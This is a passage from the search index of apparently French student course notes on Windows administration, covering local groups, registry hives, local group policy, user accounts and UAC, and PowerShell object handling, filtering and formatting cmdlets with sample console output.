technicien de</p> <ul> <li>gerer les authorisations d'acces aux ressources</li> <li>gerer les privilges d'administration</li> </ul> <p>Groupes pr\u00e9d\u00e9finis (pr\u00e9sent nativement) Permet de configurer les privileges et de deleguer des taches d'administration standard comme par exemple :</p> <ul> <li>gerer des sauvegardes</li> <li>configurer la carte r\u00e9seaux</li> <li>lire les journaux d'evenements</li> </ul> <p>Entit\u00e9s int\u00e9gr\u00e9es de s\u00e9curit\u00e9 Groupe transparant affect\u00e9 au utilisateur automatiquement par windows</p> <ul> <li>non visible dans les consoles</li> <li>affectation automatique</li> <li>utilis\u00e9s par le systemes pour les gestion des permissions (tout le monde, utilisateur authentifi\u00e9s...)</li> </ul>"},{"location":"Windows/Client/Groupe_utilisateurs/groupes/#strategie-de-groupe-local","title":"Strat\u00e9gie de Groupe Local","text":""},{"location":"Windows/Client/Groupe_utilisateurs/groupes/#la-base-de-registre-windows","title":"La base de registre windows","text":"<p>La base de registre windows, il s'agit</p> <ul> <li>d'une base de donn\u00e9es native a destinations du systeme, elle est hierarchique et centrale</li> <li>stocke toutes les informations de configuration du systeme (du 1er demarrage et durant toute sa dur\u00e9e de vie)</li> <li>pour un ou plusieurs utilisateurs,</li> <li>programmes,</li> <li>p\u00e9riph\u00e9riques mat\u00e9riels</li> <li>utilis\u00e9 depuis windows 98</li> <li>contient des milliers de parametres</li> </ul> <p>Windows consulte en permanence les informations contenues dans le registre de cette base dans le but d'executer dans les meilleurs conditions les ordres que l'utilisateur lui donne.</p> <p>La base de registre est consultable via la commande <code>regedit</code></p> <p>A manipuler avec la plus grande pr\u00e9caution</p>"},{"location":"Windows/Client/Groupe_utilisateurs/groupes/#les-ruches","title":"Les RUCHES","text":"<p>les donn\u00e9es de la base de registre sont regroup\u00e9es sous 5 cat\u00e9gories (ou ruches)</p> <ol> <li>HKEY_CLASSES_ROOT : informations sur les applications (objets OLE, extensions)</li> <li>HKEY_CURRENT_USER : Configuration relative \u00e0 l'utilisateur actuel qui a ouvert une session sur l'ordinateur    (= HKEY_USERS  SID)</li> <li>HKEY_LOCAL_MACHINE : Contient des informations de configurations sp\u00e9cifiques a l'ordinateur (pour n'importe quel utilisateur ayant utilis\u00e9 l'ordinateur)</li> <li>HKEY_USERS : Contient tous les profils utilisateur charg\u00e9s activement sur l'ordinateur</li> <li>HKEY_CURRENT_CONFIG : Profil materiel utilis\u00e9 par l'ordinateur</li> </ol> <p>Pour la gestion/configuration des strat\u00e9gie de Groupes Locaux il faudra particulierement travaill\u00e9 avec les ruches 2 &amp; 3</p> <p>LEs ruches contiennent des cl\u00e9s, qui peuvent elles meme contenir d'autre cl\u00e9s, comportant des valeurs. Ces valeurs peuvent etre sous forme:</p> <ul> <li>binaire :</li> <li>On/Off</li> <li>1/0</li> <li>True/False</li> <li>hexadecimal</li> <li>chaine de caractere</li> </ul> <p>[exemple de cours imprimante]</p> <p>cl\u00e9 drivername = chaine de caractere : nom du pilote cl\u00e9 set as defaut &amp; Shared = poss\u00e8de des valeurs a 0 cela sous entent que cette imprimante n'est pas l'imprimante par d\u00e9faut de l'utilisateur et quelle n'est pas partag\u00e9e</p>"},{"location":"Windows/Client/Groupe_utilisateurs/groupes/#les-lgpo-local-group-policy-object","title":"Les LGPO (Local Group Policy Object)","text":"<p>Elles permettent de gerer le comportement du poste de travail et des utilisateurs avec une seule et m\u00eame console:</p> <ul> <li>via le composant logiciel enfichable \"editeur d'objet de strat\u00e9gie de groupe\"</li> <li>via la console strat\u00e9gie de securit\u00e9 local, plus orient\u00e9 securit\u00e9 du systeme (appelable via le raccourci <code>secpol</code>)</li> </ul> <p>Elles vont nous permettes de reduire le temps consacr\u00e9 a la gstion du poste de travail toutes base de donn\u00e9es est li\u00e9e a des applications qui les exploitent de facon plus efficace et de facon plus conviviable.</p> <p>Les LGPO permettent:</p> <ul> <li>modifier et renforcer les strat\u00e9gie de mdp</li> <li>Agir sur les privileges d'administration du systeme</li> <li>Uniformiser/configurer l'aspect du poste de travail pour les differents utilisateur</li> <li>Restreindre l'acces a certain parametre (panneau de configuration), certain menu du systeme (invite de commande) afin de fiabiliser et securis\u00e9 le poste de travail</li> <li>demarrer des scripts a l'ouverture/fermeture de session utilisateur</li> <li>...</li> </ul> <p>le composant logiciel enfichable \"editeur d'objet de strat\u00e9gie de groupe\" permet d'agir sur</p> <ul> <li>la ruche 3, eventuellement agir sur la ruche d'un ordinateur distant</li> <li>la ruche 2, il agit donc sur les utilisateurs de la base SAM ainsi que sur des groupes pr\u00e9d\u00e9finis (les groupes locaux n'apparaissent pas)</li> <li>administrateur</li> <li>non administrateur</li> </ul> <p>La console permet de naviguer parmis les parametres sur lesquel nous pouvons agir chaque parametre peut-etre active ou desactiv\u00e9, par d\u00e9faut chaque parametre est non configur\u00e9, c'est le systeme qui d\u00e9cide par d\u00e9faut. Les parametres peuvent etre comment\u00e9 pour les eclairer, laisser des traces. Ils possedent \u00e9galement des conditions, les conditions sont list\u00e9 dans le cadre \"prise en charge sur\" [screen pdf cours] dans notre exemple il s'agit de supprimer le lien jeux du menu demarrer, cela ne sera possible que sur Windows Server 2008, windows 7 et Windows Vista. Chaque parametre possede une aide.</p>"},{"location":"Windows/Client/Groupe_utilisateurs/utilisateurs/","title":"Utilisateurs","text":"<p>la not\u00b0 d'utilisateur est une notion crucial</p> <p>win10 est partout dans les entreprises et est le point d'acces au systemes d'information de l'entreprise qui vous permet de travailler. du coup</p> <ul> <li>etes vous une personne de confiance ?</li> <li>etes vous une personne ayant le droit d'acceder au donn\u00e9es de l'entreprise?</li> <li>les donn\u00e9es pouvez vous :<ul> <li>les consulter</li> <li>les modifier</li> <li>quelle fichier</li> <li>quelle dossier</li> <li>avez vous acces a l'ensemble du systeme d'info ou simplement a une partie</li> </ul> </li> <li>etes vous un membre del'enterprise hors service informatique</li> <li>etes vous exterieur a l'enteprise (prestataire)</li> <li> <p>etes vous membre de l'equipe IT Toutes c'est questions doivent-etre trait\u00e9es car il s'agit de la base de la s\u00e9curit\u00e9 informatique</p> </li> <li> <p>Id?</p> </li> <li>Mdp?</li> <li>Acces en lecture ? En \u00e9criture ?</li> <li>a quelques fichiers ? a l'ensemble du r\u00e9seau ?</li> <li>Simple utilisateur ? Tech Info ? administrateur de l'entreprise ? etc</li> </ul> <p>La regle d'or est la suivante : 1 collaborateur de l'entreprise = 1 utlisateur du systeme d'information de l'entreprise Acces au SI valid\u00e9 par : couple : Id + MdP Biom\u00e9trie (windows hello) objet tiers (carte a puce, badge..) 2<sup>nd</sup> authentification possible (SMS, lien de validation, etc)</p>"},{"location":"Windows/Client/Groupe_utilisateurs/utilisateurs/#gestion-des-utilisateurs","title":"Gestion des utilisateurs","text":"<p>Utilisateur Local</p> <ul> <li>Propre a chaque ordinateur</li> <li>stock\u00e9 dans la base de donn\u00e9es locale SAM (Base Security Account Manager)</li> <li>ne peut exploiter que les ressources de l'ordinateur source</li> </ul> <p>Utilisateur de domaine (rsx entreprise) besoin d'etre reconnu par plusieurs ordinateur et/ou serveur</p> <ul> <li>stock\u00e9 dans une base de donn\u00e9es commune (annuaire Active Directory)</li> <li>sur un serveur de l'entreprise (controleur de domaine)</li> <li>Externalis\u00e9 chez un prestataire (MS Azure ou autre)</li> <li>Authentification Kerberos s\u00e9curis\u00e9e par le r\u00e9seau</li> <li>un utilisateur peut ouvrir une session sur tous les ordinateurs du domaine</li> <li>un utilisateur (local,dedomaine) est identifi\u00e9 par le systeme grace a son SID (Security IDentifier)</li> </ul> <p>lors de l'identifiaction l'ordinateur contact (de maniere securis\u00e9) le controleur de domaine et lui transmet ID et Mdp, le serveur controle la pr\u00e9sence de l'utilisateur dans l'annuaire et donne le feu vert ou non a 'lordi pour l'ouverture de session.</p>"},{"location":"Windows/Client/Groupe_utilisateurs/utilisateurs/#ouverture-de-session","title":"ouverture de session","text":"<ul> <li>utilisateur locaux</li> <li>utiliser un compte pr\u00e9sent dans la base SAM</li> <li> <p>compte affich\u00e9s par d\u00e9faut sur l'\u00e9cran d'accueil</p> </li> <li> <p>utilisateur du domaine</p> </li> <li>Jonction du poste au domaine de l'entreprise indispensable au pr\u00e9alable (inscription de la machine dasn la base de l'annuaire)</li> <li>domaine selectionn\u00e9 par defaut et on peut entrer le couple ID &amp; Mdp inscrit dans l'AD<ul> <li>Possibilit\u00e9 de s'authentifier a un autre domaine grace a l'annuaire de l'autre domaine</li> </ul> </li> </ul> <p>! les utilisateur locaux sont toujours pr\u00e9sent dans la machine, apres une jonction de domaine, toujours identifiable mais ils n'apparaissent plus \u00e0 l'ecran de connexion une fois l'ordinateur joint au domaine !</p>"},{"location":"Windows/Client/Groupe_utilisateurs/utilisateurs/#categories-dutilisateurs","title":"cat\u00e9gories d'utilisateurs","text":"<ol> <li>Standard</li> <li>ouvrir une session et utiliser les ressources de l'ordinateur</li> <li> <p>considere comme standard des qu'il devient membre du groupe utlisateur</p> </li> <li> <p>Administrateur (possede plus de privilege qu'un utlisateur standard)</p> </li> <li>peut toujours ouvrir une session et utliser les ressources de l'ordinateur</li> <li>Peut modifier le systeme</li> <li>etre membre du groupe administrateur</li> <li>utilisateur cr\u00e9e \u00e0 l'instalation du systeme fait partit du groupe administrateur (est referenc\u00e9 dans la base SAM)</li> <li> <p>autre compte administrateur (compt\u00e9 g\u00e9n\u00e9rique car il n'identifie personne) pr\u00e9-existant dans le systeme (referenc\u00e9 dans la base SAM), il est desactiver nativement car cela represente une faille de s\u00e9cu</p> </li> <li> <p>Compte invit\u00e9</p> </li> <li>Pour une utlisation restreinte et temporaires des ressources de l'ordinateur</li> <li>Pas besoin de mdp pour acc\u00e9der au ressources (utlisateur non authentifier)</li> <li>compte d\u00e9sactiv\u00e9 par d\u00e9faut (compte g\u00e9n\u00e9rique comme le administrateur)</li> </ol>"},{"location":"Windows/Client/Groupe_utilisateurs/utilisateurs/#gestion-des-profils","title":"Gestion des profils","text":"<p>chaque utilisateur a son propre profil, le profil est l'esp. perso de l'utilisateur il en est propri\u00e9taire un utilisateur possede un profil des lors qu'il ouvre une session pour la premiere fois, un profil perso est cr\u00e9\u00e9</p> <ul> <li>dans le dossier c:\\users</li> <li>propre a chaque utilisateur (autant de sous dossier que d'utilisateur ayant ouvert au moins une fois une session sur l'ordinateur)</li> <li>contient tous les parametres et donn\u00e9es de l'utilisateur :</li> <li>documents</li> <li>T\u00e9lechargement</li> <li>bureau et raccourci qu'il contient</li> <li>images</li> <li>etc</li> </ul> <p>Profil Public commun a tous les utilisateurs se que contient le profil public se repercutera sur les profil perso des utilisateurs</p> <p>Profil par d\u00e9faut: sert de base a la cr\u00e9ation des profil d'utilisateur (possibilit\u00e9 de le modifier, l'enrichir, le faire evoluer)</p>"},{"location":"Windows/Client/Groupe_utilisateurs/utilisateurs/#comment-gerer-les-profils","title":"Comment gerer les profils ?","text":"<p>connaitre les bonnes pratique de gestion de profil chaque sous dossier dans c:\\users est li\u00e9 a un utyilisateur et contient des jointure avec le DD et notamment avec la base SAM qui elle est meme est contenu dans la base de registre de l'ordi. il est donc fortement deconseill\u00e9 de manipuler les profils directement depuis le r\u00e9p. c:\\users.</p> <p>Il faut passer par les parametres systemes avanc\u00e9s (sysdm.cpl onglet parametres systemes avanc\u00e9s)</p> <ul> <li>supp des profils</li> <li>modifier le type du profil</li> <li>gestion du profil par d\u00e9faut</li> </ul>"},{"location":"Windows/Client/Groupe_utilisateurs/utilisateurs/#les-outils","title":"les outils","text":"<p>Plusieurs possibilit\u00e9 pour gere les utilisateurs et les groupes.</p> <p>graphiquement depuis la console mmc</p> <ul> <li>lusrmgr.msc (gestion des utilisateurs et groupes locaux)</li> <li>compmgmt.msc (gestion de l'ordinateur)</li> </ul> <p>menu comptes d'utilisateurs dans le panneau de configuration (orient\u00e9 utilisateur que technicien systeme ! utilisation deconseill\u00e9 !)</p> <p>en ligne de commande avec le shell cmd.exe (gestion utilisateur et groupes)</p> <ul> <li>net user (net help user pour l'aide d\u00e9taill\u00e9e)</li> <li>net localgroup (net help localgroup)</li> </ul> <p>Configuration en Powershell</p> <ul> <li>notamment avec les cmdlets associ\u00e9 au nom localuser et localgroup ou localgroupmenber</li> </ul>"},{"location":"Windows/Client/Groupe_utilisateurs/utilisateurs/#uac","title":"UAC","text":"<p>(controle de compte utilisateur) sans action particuliere le systeme loge tous les utilisateur a la meme enseigne... meme les administrateurs Toutes action sur le systeme est considerer comme un utilisateur standard (meme en temps que membre du groupe administrateur)*</p> <p>il faut donc justifier le droit d'utiliser des privileges d'administration, et c'est la que l'UAC intervient.</p> <ul> <li>par l'intermediaire de l'UAC, le systeme n'accorde les privileges que lorsque c'est n\u00e9cessaire</li> <li>elevation de pouvoir symbolis\u00e9e par le \"bouclier\"</li> <li>si utilisateur membre du groupe administrateur une validation est requise</li> <li>dans le cas contraire un authentification administrateur est requise</li> </ul> <p>Pourquoi ces controles ?</p> <ul> <li>lutter contre les actions des programmes malveillants</li> <li>avertir face a un parametre sensible du systeme</li> </ul> <p>! il est deconseill\u00e9 de desactiver l'UAC ! (en rouge)</p> <p>Comment le configurer ?</p> <ul> <li>via le panneau de configuration</li> <li>via la console de strat\u00e9gie locale</li> <li>secpol.msc</li> <li>strat\u00e9gie locales&gt;options de s\u00e9curit\u00e9</li> <li>valeurs controle de compte utilisateur</li> </ul> <p>en genreal la configuration par defaut du niveau de l'UAC est suffisante.</p> <p>Pour certaine il est necessaire de demander l'elevation de droit. ex: je souhaite modifier le systeme via <code>cmd.exe</code> il faudra lancer la console avec des privilege d'administration (clic droit lancer la console en administrateur)</p> <p>R\u00e9capitulatif module</p> <p>utilisateur :</p> <ul> <li>nom ouverture de session &amp; mdp</li> <li>profil local contenant les donnees personnelles de l'utilisateur (cr\u00e9e a la premiere ouverture de session)</li> <li>SID unique identifiant l'utilisateur sur le systeme</li> <li>appartenances de groupes d\u00e9finies dans l'onglet Membre de</li> <li>l'ensemble des SID constituant le jeton d'acces, ouvrant des acc\u00e8s &amp; accordant des privileges d'administration</li> </ul> <p>! informations des jetons d'acces consultables avec la commande whoami /user</p>"},{"location":"Windows/Powershell/Cmdlets_de_base_et_objets/","title":"Cmdlets de Base","text":"<p>PS est un langage d'administration orient\u00e9e objets... unobjet PS n'est pas nouvelle et viens du dev (le PHP ou le Csharp) un objet PS est un \u00e9l\u00e9ment du systeme que l'on peut manipuler, configurer (ex: une carte r\u00e9seau, un DD, un utilisateur, un fichier etc.) chacun de ces objets possede des propri\u00e9t\u00e9s/des caract\u00e9ristiques et des methodes/des actions que l'on peut mener sur ces objets comprendre la notion d'objets. comparons un objet PS avec un objet de tous les jours l'objet : monballon un ballon possedde des caract\u00e9ristiques (propri\u00e9t\u00e9 en PS):</p> <ul> <li>une forme (sph\u00e9rique, ovale..)</li> <li>des dimensions</li> <li>une masse</li> <li>... des actions peuvent etre realis\u00e9 sur ce ballon (des m\u00e9thodes en PS):</li> <li>le lancer</li> <li>le gonfler</li> <li>...</li> </ul> <p>comment afficher les caract. de l'objet \"monballon\": nous parlons de collection d'objet car nous pouvons posseder plusieurs ballon (tout comme un ordinateur oeut posseder plusieurs utilisateur, plusieurs fichiers, ou plusieeurs carte reseau)</p> <p>si je fais : Get-monballon</p> <ul> <li>Afficher certaines propri\u00e9t\u00e9s de l'objet, les propri\u00e9t\u00e9s que le systeme considere comme majeur</li> <li>toutes les propri\u00e9t\u00e9s ne sont pas affich\u00e9, elles existent mais cach\u00e9es pour faciliter la lecture \u00e0 l'\u00e9cran</li> </ul> <p>Get-monballon | select*</p> <ul> <li>affiche toutes les propri\u00e9t\u00e9s de l'objet et lerus valeurs associ\u00e9es (* represente toutes les caract de l'objet)</li> </ul> <p>Get-monballon | select [diametre,forme,couleur]</p> <ul> <li>n'affiche seulement que les propri\u00e9t\u00e9s demand\u00e9es et leurs valeurs associ\u00e9es</li> </ul> <p>(get-monballon).description</p> <ul> <li>affiche la propri\u00e9t\u00e9 description de l'objet et sa valeur</li> <li>equivaut a Get-monballon | select description</li> </ul> <p>il existe des cmdletsqui permettent d'interagir avec les objets d'affich les prop. de modifier, de creer, dans supp pour cela il existe une cmdlets get-command qui permet d'afficher toutes les cmdlets/les alias/les fonctions.</p> <p>il y a la possibilit\u00e9 de filtrer cette affichage via: [Get-command get-*]</p> <ul> <li>n'affiche que les cmdlets commencant par le verbe get</li> <li><code>*</code> represente n'importe quelle chaine de caraact donc n'importe quel nom</li> </ul> <p>[get-command printer]</p> <ul> <li>affiche toutes les commandes contenant la chaine de caract printer</li> <li>permet d'int\u00e9ragir avec les imprimantes (donc l'objet printer)</li> </ul> <p>[get-command new-user]</p> <ul> <li>affiche tts les cmdlets commencant par new ET contenant la chaine de caract user</li> </ul> <p>une fois avoir trouv\u00e9 la bonne commande il faudra utliser l'aide pour savoir comment bien l'utiliser</p>"},{"location":"Windows/Powershell/Cmdlets_de_base_et_objets/#interargir-avec-un-objet-powershell","title":"Interargir avec un objet powershell","text":"<p>mecanisme d'utilisation des cmdlets, interactive et intuitive comparaison avec un objet du monde reel :</p> <p>je fais la collection de ballon en tout genre, collection que je souhaite faire evoluer. je me rend compte que la description de mon ballon de basket est fausse, je dois donc la modifier :</p> <ul> <li>set-monballon -nom \"basket\" -description \"ballon de basket\" je veux ajouter un nouveau ballon de rugby blanc</li> <li>new-monballon -nom \"rugby\" -forme \"ovale\" -couleur \"blanc\" -description \"ballon de rugby\" je veux supp un ballon de football</li> <li>remove-monballon -nom \"Football\"</li> </ul> <p>Il faut r\u00e9fl\u00e9chir de la meme maniere avec les objets PS (utilisateur, imprimante) il faut travailler par etapes</p> <ul> <li>chercher la bonne cmdlets via get-commands</li> <li>en selectionnant la commands adequate en affichant l'aide</li> <li>on peut tester et affiner la commandes pour avoir le resultat voulu</li> </ul>"},{"location":"Windows/Powershell/Le_Filtrage/","title":"Le filtrage","text":""},{"location":"Windows/Powershell/Le_Filtrage/#basique","title":"Basique","text":"<p>Permet d'affiner le filtrage, obtenu par le pipeline et la <code>cmdlet select</code>, afin de selectionner certines valeurs contenu dans des propri\u00e9t\u00e9s. Pour cela la connaissance des op\u00e9rateurs de comparaisons est n\u00e9cessaire, il existe une section d'aide pour les d\u00e9couvrir et savoir comment les utiliser <code>Get-help About_Comparison_Operators</code></p> <p></p> <p>Le filtrage basique ne permet de filtrer qu'une seule propri\u00e9t\u00e9 via la cmdlet <code>Where-object</code> ou seulement <code>Where</code></p> <p>En reprenant l'exemple des cartes r\u00e9seaux:</p> <ul> <li>Apres avoir fait un <code>Get-Netadapter | select name,Status,Linkspeed</code></li> </ul> <pre><code>PS D:\\Informatique\\Mkdocs\\cours-eni&gt; get-netadapter | select name,status,linkspeed\n\nname                          Status       LinkSpeed\n----                          ------       ---------\nVMware Network Adapter VMnet1 Up           100 Mbps\nConnexion au r\u00e9seau local 2   Disconnected 1 Gbps\nVMware Network Adapter VMnet8 Up           100 Mbps\nWi-Fi                         Up           1.2 Gbps\nConnexion r\u00e9seau Bluetooth    Disconnected 3 Mbps\nEthernet                      Disconnected 0 bps\n</code></pre> <ul> <li>Nous pouvons faire un <code>Get-Netadapter | select name,Status,Linkspeed | Where Status -like Up</code> la cmdlet <code>Where</code> vas permettre de selectionner la colonne <code>status</code> puis, ensuite, en lui affectant l'element de comparaison <code>like</code> on peut choisir le statut souhait\u00e9 UP pour les \u00e9l\u00e9ments connect\u00e9 (ou Disconnected pours les \u00e9lements deconnect\u00e9s)</li> </ul> <pre><code>PS D:\\Informatique\\Mkdocs\\cours-eni&gt; get-netadapter | select name,status,linkspeed | where status -like UP\n\nname                          Status LinkSpeed\n----                          ------ ---------\nVMware Network Adapter VMnet1 Up     100 Mbps\nVMware Network Adapter VMnet8 Up     100 Mbps\nWi-Fi                         Up     1.2 Gbps\n</code></pre> <p>A noter le rajout via le <code>|</code> d'une 3eme cmdlet where comme vue dans le module Pipeline </p>"},{"location":"Windows/Powershell/Le_Filtrage/#avances","title":"Avanc\u00e9s","text":"<p>Pour le filtrage avanc\u00e9, l'utilisation de la meme <code>cmdlet **where**</code> est toujours requis mais celle-ci sera enrichi, etoff\u00e9 par:</p> <ul> <li>l'ajout d'un script de filtrage <code>-FilterScript {}</code> dans la cmdlet where-object</li> <li>La possibilit\u00e9 d'utiliser la variable <code>$PSITEM</code> (ou <code>$</code>) pour plus de productivit\u00e9</li> <li><code>$_</code>contient tous les objets transmis \u00e0 Where-Object</li> </ul> <pre><code>PS D:\\Informatique\\Mkdocs\\cours-eni&gt; get-netadapter | select name,status,linkspeed | where -filterscript {$_.status -like \"up\" -and $_.linkspeed -gt \"100 Mbps\"}\n\nname                          Status LinkSpeed\n----                          ------ ---------\nVMware Network Adapter VMnet1 Up     100 Mbps\nVMware Network Adapter VMnet8 Up     100 Mbps\n</code></pre> <p>A noter le rajout de <code>FilterScript {}</code> afin de filtrer les resultats obtenus pr\u00e9cedemment puis ajout des <code>$_.</code> pour lui specifier les elements dans lesquel il doit chercher.</p>"},{"location":"Windows/Powershell/Le_Formatage/","title":"Formatage Powershell","text":"<p>Par d\u00e9faut powershell \"formate\" les resultats des cmdlets avant de les afficher \u00e0 l'ecran.</p> <p>le \"Formatage\" ici fait reference \u00e0 de la mise en page ou de la mise en forme</p> <p>La mise en page par d\u00e9faut peut-etre modifier via les cmdlets suivante :</p> <ul> <li><code>Format-List</code> : Permet l'affichage des r\u00e9sultats sous forme de liste</li> <li><code>Format-Table</code>: permet l'affichage sous forme de tableau (comportant des lignes et des colonnes)</li> <li><code>Format-Wide</code>: permet de mettre en forme les valeurs d'une propri\u00e9t\u00e9 sp\u00e9cifique selectionn\u00e9.</li> </ul> <p>Les cmdlets <code>Format-*</code> denature les objets elle doivent donc etre utilis\u00e9 a la fin, une fois le travail terminer et enchainer les <code>|</code> (pipeline)</p>"},{"location":"Windows/Powershell/Le_Formatage/#format-list","title":"Format-List","text":"<p>Permet de mettre les resultats sous forme de liste</p> <p>! La cmdlet <code>format-list</code> peut \u00e9galement etre ecrite <code>FL</code> !</p> <p>exemple avec la cmdlet <code>Get-service</code></p> <pre><code>PS D:\\Informatique\\Mkdocs\\cours-eni&gt; get-service\n\nStatus   Name               DisplayName\n------   ----               -----------\nStopped  AarSvc_33fca3      Agent Activation Runtime_33fca3\nRunning  AdobeARMservice    Adobe Acrobat Update Service\nStopped  AfVpnService       AfVpnService\nRunning  agent_ovpnconnect  OpenVPN Agent agent_ovpnconnect\n</code></pre> <p><code>Get-service | format-list</code></p> <pre><code>PS D:\\Informatique\\Mkdocs\\cours-eni&gt; get-service | format-list\n\nName                : AarSvc_33fca3\nDisplayName         : Agent Activation Runtime_33fca3\nStatus              : Stopped\nDependentServices   : {}\nServicesDependedOn  : {}\nCanPauseAndContinue : False\nCanShutdown         : False\nCanStop             : False\nServiceType         : 224\n\nName                : AdobeARMservice\nDisplayName         : Adobe Acrobat Update Service\nStatus              : Running\nDependentServices   : {}\nServicesDependedOn  : {}\nCanPauseAndContinue : False\nCanShutdown         : False\nCanStop             : True\nServiceType         : Win32OwnProcess\n\nName                : AfVpnService\nDisplayName         : AfVpnService\nStatus              : Stopped\nDependentServices   : {}\nServicesDependedOn  : {}\nCanPauseAndContinue : False\nCanShutdown         : False\nCanStop             : False\nServiceType         : Win32OwnProcess\n\nName                : agent_ovpnconnect\nDisplayName         : OpenVPN Agent agent_ovpnconnect\nStatus              : Running\nDependentServices   : {}\nServicesDependedOn  : {}\nCanPauseAndContinue : False\nCanShutdown         : False\nCanStop             : True\nServiceType         : Win32OwnProcess\n</code></pre> <p><code>Get-service | Format-wide -property name</code></p> <pre><code>PS D:\\Informatique\\Mkdocs\\cours-eni&gt; get-service | format-wide -property name  \n\nAarSvc_33fca3                                                                      AdobeARMservice\nAfVpnService                                                                       agent_ovpnconnect\nAJRouter                                                                           ALG\nAORUS LCD Panel Service                                                            AppIDSvc\nAppinfo                                                                            AppMgmt\nAppReadiness                                                                       AppVClient\nAppXSvc                                                                            AssignedAccessManagerSvc\nAudioEndpointBuilder                                                               Audiosrv\nautotimesvc                                                                        AxInstSV\nBcastDVRUserService_33fca3                                                         BDAppSrv\nBDAuxSrv                                                                           BDESVC\nBDProtSrv                                                                          bdredline\nbdredline_agent                                                                    BDSafepaySrv\nBdVpnService                                                                       BFE\nBITS                                                                               BluetoothUserService_33fca3\n</code></pre> <p>Via <code>-property</code> on specifie la caracteristique a sortir ex:</p> <ul> <li><code>-Property *</code> sp\u00e9cifie que l'on veut tous les champs,</li> <li><code>-Property Name,status,displayname</code> sp\u00e9cifie que l'on veut les noms, statut et le nom d'affichage (\u00e9quivalent \u00e0 <code>select</code>)</li> </ul>"},{"location":"Windows/Powershell/Le_Formatage/#format-table","title":"Format-Table","text":"<p>Permet de mettre les resultats sous forme de Tableau</p> <p>! La cmdlet <code>format-table</code> peut \u00e9galement etre ecrite <code>FT</code> !</p> <p>exemple avec la cmdlet <code>Get-Timezone</code></p> <pre><code>PS D:\\Informatique\\Mkdocs\\cours-eni&gt; get-timezone\n\nId                         : Romance Standard Time\nHasIanaId                  : False\nDisplayName                : (UTC+01:00) Bruxelles, Copenhague, Madrid, Paris\nStandardName               : Paris, Madrid\nDaylightName               : Paris, Madrid (heure d\u2019\u00e9t\u00e9)\nBaseUtcOffset              : 01:00:00\nSupportsDaylightSavingTime : True\n</code></pre> <p><code>Get-Timezone | Format-Table</code></p> <pre><code>PS D:\\Informatique\\Mkdocs\\cours-eni&gt; get-timezone | Format-Table\n\nId                    HasIanaId DisplayName                                      StandardName  DaylightName                BaseUtcOffset SupportsDaylightSavingTime   \n--                    --------- -----------                                      ------------  ------------                ------------- --------------------------   \nRomance Standard Time     False (UTC+01:00) Bruxelles, Copenhague, Madrid, Paris Paris, Madrid Paris, Madrid (heure d\u2019\u00e9t\u00e9) 01:00:00                            True   \n</code></pre> <p><code>Get-Timezone | Format-table -property *</code></p> <p>Affichera la meme reponse que celle du dessus car <code>-property *</code>selectionne tout les \u00e9lement de la r\u00e9ponse.</p> <p><code>Get-Timezone | FT -property standarname,baseutcoffset -autosize</code>*</p> <pre><code>PS D:\\Informatique\\Mkdocs\\cours-eni&gt; get-timezone | Format-Table -property StandardName,baseUtcoffset -autosize\n\nStandardName  BaseUtcOffset\n------------  -------------\nParis, Madrid 01:00:00\n</code></pre> <p><code>-autosize</code> permet de dimensionner la largeur des colonnes automatiquement en fonction des valeurs contenu et de la largeur de la console Powershell</p>"},{"location":"Windows/Powershell/Le_Formatage/#format-wide","title":"Format-Wide","text":"<p>Permet de renvoyer le r\u00e9sultat sous forme de Tableau</p> <p>Elle ne travail qu'avec une seule propri\u00e9t\u00e9.</p> <p>Possibilit\u00e9 de mettre en forme selon les besoins en selectionnant la propri\u00e9t\u00e9 souhait\u00e9 puis choisir le nombre de colonne que l'on souhaite</p> <p>Exemple avec la cmdlet <code>Get-Process</code></p> <pre><code>PS D:\\Informatique\\Mkdocs\\cours-eni&gt; get-process     \n\n NPM(K)    PM(M)      WS(M)     CPU(s)      Id  SI ProcessName\n ------    -----      -----     ------      --  -- -----------\n     54    51,43      87,71       6,23   25540   1 Acrobat\n     15     2,83      10,16       0,02   22972   1 acrotray\n     10     2,01      10,91       0,11    6708   0 agent_ovpnconnect_1675786017207\n     11     2,85      11,27       0,00    9308   0 AggregatorHost\n     25    14,48      35,52       0,02    6132   1 ApplicationFrameHost\n      9     1,62       6,75       0,00    6672   0 armsvc\n     17    11,16      21,32       8,55   21712   0 audiodg\n     56    52,91      43,79       4,09   15996   1 bdagent\n     20    11,06      22,36       0,00   11752   0 bdntwrk\n     13     3,46      13,92       0,00   13340   0 bdredline\n............................................\n</code></pre> <p><code>Get-process | Format-Wide</code> Avec cette cmdlet on laisse <code>Format-Wide</code> choisir le format de sortie</p> <pre><code>PS D:\\Informatique\\Mkdocs\\cours-eni&gt; get-process | FW\n\nAcrobat                                                                                                              acrotray\nagent_ovpnconnect_1675786017207                                                                                      AggregatorHost\nApplicationFrameHost                                                                                                 armsvc\naudiodg                                                                                                              bdagent\nbdntwrk                                                                                                              bdredline\nbdredline                                                                                                            bdservicehost\nbdservicehost                                                                                                        bdservicehost\nbdservicehost                                                                                                        bdservicehost\nbduserhost                                                                                                           bduserhost\n............................................................\n</code></pre> <p>La cmdlet <code>Format-Wide</code> choisis de nous l'afficher sur 2 colonnes</p> <p><code>Get-Process | Format-Wide -property ID -column 5</code> Cette fois on sp\u00e9cifie la propri\u00e9t\u00e9 'ID' et on demande de l'afficher sur 5 colonnes</p> <pre><code>PS D:\\Informatique\\Mkdocs\\cours-eni&gt; get-process | FW -property ID -column 5\n\n25540                                          22972                                          6708                                           9308                                          6132\n6672                                           21712                                          15996                                          11752                                         13340\n13408                                          2848                                           2856                                           3704                                          3728\n6820                                           4456                                           8388                                           19920                                         3720\n17904                                          2400                                           5344                                           5972                                          10908\n15036                                          15104                                          18244                                          20728                                         21728\n22080                                          23116                                          23300                                          23828                                         5900\n6368                                           10004                                          13844                                          19008                                         19224\n1684                                           1788                                           18564                                          6016                                          9580\n3316                                           9956                                           17444                                          18736                                         26208\n.................................\n</code></pre> <p><code>Get-Process | FW -property ID -autosize</code> Cette fois en sp\u00e9cifiant <code>-autosize</code> on laisse le parametre definir la largeur en fonction de la taille de votre console PowerShell</p> <pre><code>PS D:\\Informatique\\Mkdocs\\cours-eni&gt; get-process | FW -property ID -autosize\n\n25540  22972  6708   9308   6132   6672  21712 15996 11752 13340 13408 2848  2856  3704  3728  6820  4456  8388  19920 3720  17904 2400  5344  5972  10908 15036 15104 18244 20728 21728 22080 23116 23300 23828 5900  6368  10004 13844 \n19008  19224  1684   1788   18564  6016  9580  3316  9956  17444 18736 26208 26268 13840 14096 15816 25824 6732  13356 11224 2268  6780  3452  3468  13060 19912 18752 20904 2728  